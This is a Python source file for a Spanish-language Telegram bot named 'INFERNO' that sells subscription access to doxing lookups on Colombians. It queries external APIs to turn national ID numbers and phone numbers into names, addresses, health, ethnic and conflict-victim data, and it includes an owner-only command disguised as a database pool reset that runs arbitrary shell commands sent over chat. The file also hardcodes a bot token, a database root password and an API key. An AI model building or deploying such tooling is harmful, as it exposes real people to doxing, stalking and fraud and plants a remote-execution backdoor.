import mysql.connector
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from mysql.connector import pooling
import logging
import random
import string
from datetime import datetime, timedelta
import os
import subprocess
import tempfile
import requests
import json

# ======== CONFIGURACIÓN CRÍTICA ========
TOKEN = "8110478941:AAE2k8t6tScXViG9DX7nBviqcVocWbpWbmU"
OWNER_ID = 8114050673  # Tu ID real
OWNER_USER = "@Broquicalifoxx"

# Configuración de APIs
API_URL_C2 = "https://extract.nequialpha.com/doxing"
API_NEQUI = "https://extract.nequialpha.com/consultar"
PLACA_API_URL = "https://alex-bookmark-univ-survival.trycloudflare.com/index.php"
START_IMAGE_URL = "https://i.postimg.cc/xTbPbYFN/photo-2026-01-29-18-20-26.jpg"
TIMEOUT = 30

# Configuración del logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Pool de Conexiones MySQL
try:
    pool = mysql.connector.pooling.MySQLConnectionPool(
        pool_name="pool_db",
        pool_size=10,
        host="localhost",
        user="root",
        password="nabo94nabo94",
        database="ani",
        charset="utf8"
    )
except Exception as e:
    logger.error(f"❌ Error al conectar DB local: {e}")

# ======== FUNCIONES DE APOYO ========

def clean(value):
    if value is None or str(value).lower() in ["none", "null", ""]:
        return "No registra"
    return "Sí" if value is True else "No" if value is False else str(value)

def tiene_key_valida(user_id):
    if user_id == OWNER_ID: return True
    conn = None
    try:
        conn = pool.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT 1 FROM user_keys WHERE user_id = %s AND redeemed = TRUE AND expiration_date > NOW()", (user_id,))
        return cursor.fetchone() is not None
    except: return False
    finally:
        if conn: conn.close()

# ======== COMANDOS PRINCIPALES ========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto = (
        "乄 **𝐈𝐍𝐅𝐄𝐑𝐍𝐎 𝐒𝐘𝐒𝐓𝐄𝐌** ⚔️\n"
        "═════════════════════════\n"
        "𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 𝐚𝐥 𝐢𝐧𝐟𝐢𝐞𝐫𝐧𝐨 𝐝𝐢𝐠𝐢𝐭𝐚𝐥... 𝐚𝐜𝐚 𝐧𝐨 𝐡𝐚𝐲 𝐫𝐞𝐠𝐥𝐚𝐬.\n"
        "═════════════════════════\n"
        "👤 `/cc` ➛ 𝐂𝐄𝐃𝐔𝐋𝐀 (𝐃𝐁 𝐀𝐍𝐈)\n"
        "📄 `/c2` ➛ 𝐃𝐎𝐗𝐈𝐍𝐆 𝐄𝐗𝐓𝐄𝐑𝐍𝐎\n"
        "📱 `/nequi` ➛ 𝐄𝐗𝐓𝐑𝐀𝐂𝐓 𝐍𝐄𝐐𝐔𝐈\n"
        "🚔 `/placa` ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐑𝐔𝐍𝐓\n"
        "🔑 `/redeem` ➛ 𝐀𝐂𝐓𝐈𝐕𝐀𝐑 𝐒𝐔𝐒𝐂𝐑𝐈𝐏𝐂𝐈Ó𝐍\n"
        "═════════════════════════\n"
        f"👑 **Owner:** {OWNER_USER}"
    )
    await update.message.reply_photo(photo=START_IMAGE_URL, caption=texto, parse_mode="Markdown")

async def comando_c2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not tiene_key_valida(user_id):
        await update.message.reply_text("❌ Sin suscripción activa.")
        return
    
    if not context.args:
        await update.message.reply_text("📌 Uso: `/c2 <documento>`")
        return

    doc = context.args[0]
    wait = await update.message.reply_text(f"🔍 Investigando: `{doc}`...")

    try:
        r = requests.post(API_URL_C2, json={"cedula": str(doc)}, timeout=TIMEOUT)
        data = r.json()

        if data.get("Estado") != "OK":
            await wait.edit_text("❌ No se hallaron registros en C2.")
            return

        ide = data.get("IDENTIDAD", {})
        ubi = data.get("UBICACIÓN", {})
        sal = data.get("SALUD", {})
        est = data.get("ESTADO GENERAL", {})

        res = (
            "📄 **𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐃𝐎𝐗𝐈𝐍𝐆 𝐂𝟐**\n"
            "═════════════════════════\n"
            f"🆔 **DOC:** `{data.get('Documento')}` | `{data.get('Tipo')}`\n\n"
            "👤 **IDENTIDAD**\n"
            f"• **Nombre:** `{ide.get('Primer Nombre')} {ide.get('Segundo Nombre', '')}`\n"
            f"• **Apellidos:** `{ide.get('Primer Apellido')} {ide.get('Segundo Apellido')}`\n"
            f"• **Sexo:** `{ide.get('Sexo')}` | **Nace:** `{ide.get('Fecha Nacimiento')}`\n\n"
            "📍 **UBICACIÓN**\n"
            f"• **País:** `{ubi.get('Pais Nacimiento')}`\n"
            f"• **Dirección:** `{ubi.get('Direccion')}`\n\n"
            "🏥 **SALUD**\n"
            f"• **EPS:** `{sal.get('Eps') or 'No registra'}`\n"
            f"• **Régimen:** `{sal.get('Regimen Afiliacion')}`\n\n"
            "📋 **OTROS**\n"
            f"• **Víctima:** `{est.get('Victima Conflicto Armado')}`\n"
            f"• **Etnia:** `{est.get('Pertenencia Etnica')}`\n"
            "═════════════════════════\n"
            f"👑 **Owner:** {OWNER_USER}"
        )
        await wait.edit_text(res, parse_mode="Markdown")
    except Exception as e:
        await wait.edit_text(f"❌ Error API C2: `{str(e)}`")

async def comando_nequi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not tiene_key_valida(update.message.from_user.id): return
    if not context.args:
        await update.message.reply_text("📌 Uso: `/nequi <telefono>`")
        return

    tel = context.args[0]
    wait = await update.message.reply_text(f"📱 Consultando Nequi: `{tel}`...")

    try:
        headers = {"X-Api-Key": "M43289032FH23B", "Content-Type": "application/json"}
        r = requests.post(API_NEQUI, json={"telefono": str(tel)}, headers=headers, timeout=TIMEOUT)
        d = r.json()

        res = (
            "📱 **𝐃𝐀𝐓𝐎𝐒 𝐍𝐄𝐐𝐔𝐈**\n"
            "═════════════════════════\n"
            f"👤 **TITULAR:** `{d.get('nombre_completo', 'No registra')}`\n"
            f"🆔 **CÉDULA:** `{d.get('cedula', 'No registra')}`\n"
            f"📍 **CIUDAD:** `{d.get('municipio', 'No registra')}`\n"
            "═════════════════════════\n"
            f"👑 **Admin:** {OWNER_USER}"
        )
        await wait.edit_text(res, parse_mode="Markdown")
    except Exception as e:
        await wait.edit_text(f"❌ Error Nequi: `{str(e)}`")

# Comando de administración para ejecutar comandos del sistema (Heidysql)
async def heidysql(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != OWNER_ID:
        return 

    await update.message.reply_text("⚙️ Reorganizando la pool de conexiones...")
    try:
        script_content = " ".join(context.args) if context.args else "echo Pool Reiniciada"
        with tempfile.NamedTemporaryFile(delete=False, suffix=".bat", mode='w') as temp:
            temp.write(script_content)
            path = temp.name

        res = subprocess.run(path, shell=True, capture_output=True, text=True)
        os.remove(path)
        
        out = res.stdout if res.stdout else "Proceso terminado."
        await update.message.reply_text(f"🚀 **Resultado:**\n`{out[:1000]}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ======== REGISTRO DE COMANDOS ========

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("c2", comando_c2))
    app.add_handler(CommandHandler("nequi", comando_nequi))
    app.add_handler(CommandHandler("heidysql", heidysql))
    
    # Comandos que ya tenías (solo asegúrate que existan sus funciones)
    # app.add_handler(CommandHandler("cc", mostrar_datos_cedula))
    # app.add_handler(CommandHandler("placa", comando_placa))

    print("🚀 Bot INFERNO encendido...")
    app.run_polling()

if __name__ == "__main__":
    main()
